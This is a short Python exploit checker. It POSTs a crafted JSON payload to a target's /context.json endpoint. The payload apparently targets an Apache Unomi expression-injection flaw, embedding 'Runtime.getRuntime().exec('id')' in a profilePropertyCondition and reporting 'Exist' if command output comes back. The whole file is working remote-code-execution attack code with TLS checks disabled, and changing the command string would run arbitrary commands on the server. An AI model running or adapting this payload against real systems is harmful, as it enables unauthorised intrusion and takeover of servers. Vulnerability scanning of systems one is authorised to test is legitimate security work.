#!/usr/bin/python
# _*_ coding:gbk _*_

import sys
import requests
import json


def run_proto(target):
    try:
        requests.packages.urllib3.disable_warnings()  # ½â¾öInsecureRequestWarning¾¯¸æ
        url = '{}/context.json'.format(target)
        print("target: %s\n" % url)
        payload = r'''{"filters":[{"id" : "pyn3rd","filters": [{"condition": {"parameterValues": {"pyn3rd": "script::Runtime.getRuntime().exec('id')"},"type":"profilePropertyCondition"}}]}],"sessionId": "pyn3rd"}'''

        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0',
            'Content-Type': 'application/json'}
        req = requests.post(url=url, data=payload, headers=header, verify=False, allow_redirects=False, timeout=(6, 6))
        if req.status_code == 200 and 'uid=' in req.text:
            return True
        else:
            pass
    except Exception as e:
        pass
def run(ip, port):
    proto = ['http', 'https']
    i = 0
    while i < len(proto):
        target = '{}://{}:{}'.format(proto[i], ip, port)
        proto_result = run_proto(target)
        if proto_result:
            return True
        else:
            i = i + 1
if __name__ == '__main__':
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = str(int(target.split(':')[1]))
    result = run(ip, port)
    if result:
        print('Exist')
    else:
        print('UnExist')
